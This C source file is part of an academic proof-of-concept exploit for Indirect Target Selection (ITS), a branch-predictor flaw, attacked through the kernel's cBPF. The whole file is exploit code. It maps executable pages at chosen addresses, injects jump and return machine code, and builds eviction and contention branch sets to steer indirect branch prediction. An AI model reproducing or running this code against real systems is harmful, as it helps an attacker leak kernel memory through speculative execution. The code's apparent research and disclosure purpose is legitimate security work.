/*
 * End-to-end ITS (Indirect Target Selection) exploit via cBPF
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <assert.h>

#include "targets.h"

// ff e7        jmp rdi
// cc           int3
// cc           int3

#define JMP_RDI_ASM    "\xff\xe7\xcc\xcc"
#define JMP_RDI_SIZE   (sizeof(JMP_RDI_ASM) - 1)
#define JMP_RDI_BRANCH_OFFSET 1

// e9 __ __ __ __   jmp ...
// cc               int3
// cc               int3
#define REL_BRANCH_ASM    "\xe9\x00\x00\x00\x00\xcc\xcc"
#define REL_BRANCH_LENGTH   5
#define REL_BRANCH_OFFSET   (REL_BRANCH_LENGTH - 1)
#define REL_BRANCH_ASM_SIZE (sizeof(REL_BRANCH_ASM) - 1)

// c3                ret
#define RET_ASM    "\xc3\xcc"
#define RET_ASM_SIZE   (sizeof(RET_ASM) - 1)



static __always_inline uint64_t get_45bit_random_value() {
    return (((uint64_t) rand() & 0x7fffLU) << 30) |
            (((uint64_t) rand() & 0x7fffLU) << 15) |
            ((uint64_t) rand() & 0x7fffLU);

}

static void dummy_ret(void)
{
}


static int map_address(uint8_t * address)
{
    void * ret;

    ret = mmap((void *) address, 0x1000, PROT_WRITE|PROT_READ|PROT_EXEC,
				MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED_NOREPLACE, -1, 0);

    if (ret == MAP_FAILED) {
        printf("[ERROR] Mapping user address %p failed: %s (%d)\n", address, strerror(errno), errno);
        return errno;
    }

    return 0;
}


static void jit_ind_branch(void * jit_addr) {
    uint8_t *start_address, *end_address;

    start_address = (uint8_t *) ((uint64_t) jit_addr & ~0xfff);
    end_address = (uint8_t *) ((uint64_t) (jit_addr + JMP_RDI_SIZE) & ~0xfff);

    assert(map_address(start_address) == 0);


    if (start_address != end_address) {
        assert(map_address(end_address) == 0);
    }

    memcpy((uint8_t *) jit_addr, JMP_RDI_ASM, JMP_RDI_SIZE);

}

static void jit_dir_branch(void * jit_addr, void * target) {
    uint8_t *start_address, *end_address;
    uint32_t off;

    start_address = (uint8_t *) ((uint64_t) jit_addr & ~0xfff);
    end_address = (uint8_t *) ((uint64_t) (jit_addr + REL_BRANCH_ASM_SIZE) & ~0xfff);

    assert(map_address(start_address) == 0);

    if (start_address != end_address) {
        assert(map_address(end_address) == 0);
    }

    off = (uint32_t) ((uint64_t) target - ((uint64_t) jit_addr + REL_BRANCH_OFFSET));

    memcpy((uint8_t *) jit_addr, REL_BRANCH_ASM, REL_BRANCH_ASM_SIZE);
    memcpy((uint8_t *) jit_addr + 1, &off, sizeof(uint32_t));

}

uint64_t initialize_evicting_branch(uint64_t evict_target) {

    uint64_t evict_address;

    evict_address = 0x100000000000 + (evict_target & (TAG_SET_MASK | 0x3f));
    evict_address -= REL_BRANCH_OFFSET;

    printf("%15s: %lx (tag: 0x%03lx, set: 0x%03lx)\n", "branch_evict", evict_address + REL_BRANCH_OFFSET,
        get_tag_for_address(evict_address  + REL_BRANCH_OFFSET),
        get_set_for_address(evict_address  + REL_BRANCH_OFFSET));

    jit_dir_branch((void *) evict_address, (void *) evict_address + REL_BRANCH_OFFSET);
    memcpy((uint8_t *) evict_address + REL_BRANCH_LENGTH, RET_ASM, RET_ASM_SIZE);


    // jump > 20 bits and return
    // address = ((uint64_t) branch_evict_list[0] + (1LU << 16)) & ~0xfffLU;

    // branch_evict_list[1] = (void *) address;

    // jit_dir_branch(branch_evict_list[0], branch_evict_list[1]);
    // jit_dir_branch(branch_evict_list[1], branch_evict_list[0] + REL_BRANCH_OFFSET);

    // memcpy((uint8_t *) branch_evict_list[1], RET_ASM, RET_ASM_SIZE);

    return evict_address;

}

void initialize_branch_contention_set(void * branch_contention_list[BTB_CONTENTION_SET_SIZE], uint64_t contention_target) {

    uint8_t ok;
    uint64_t address;

    for (int i = 0; i < BTB_CONTENTION_SET_SIZE; i++)
    {

        ok = 0;

        while (!ok)
        {
            ok = 1;
            address = 0x100000000000 + (get_45bit_random_value() %  (1 << 29));
            address &= ~(SET_MASK | 0x3f);
            address += contention_target & (SET_MASK);
            address -= REL_BRANCH_OFFSET - 1;

            //Avoid self collision
            for(int j = 0; j < i; j++) {

                if(labs(address - (uint64_t) branch_contention_list[j]) <= REL_BRANCH_ASM_SIZE) {
                    ok = 0;
                    break;
                }
            }

        }

        branch_contention_list[i] = (void *) address;

        printf("%15s: %p (tag: 0x%03lx, set: 0x%03lx)\n", "branch_evict", branch_contention_list[i] + REL_BRANCH_OFFSET - 1,
            get_tag_for_address((uint64_t) branch_contention_list[i]  + REL_BRANCH_OFFSET - 1),
            get_set_for_address((uint64_t) branch_contention_list[i]  + REL_BRANCH_OFFSET - 1));


    }

    // Jit the branches
    for(int i = 0; i < BTB_CONTENTION_SET_SIZE - 1; i++)
    {
        jit_dir_branch(branch_contention_list[i], branch_contention_list[i + 1]);
    }

    void * last_branch = branch_contention_list[BTB_CONTENTION_SET_SIZE - 1];
    jit_dir_branch(last_branch, last_branch + REL_BRANCH_OFFSET);

    // memcpy((uint8_t *) last_branch + REL_BRANCH_OFFSET, RET_ASM, RET_ASM_SIZE);
    memcpy((uint8_t *) last_branch, RET_ASM, RET_ASM_SIZE);

}
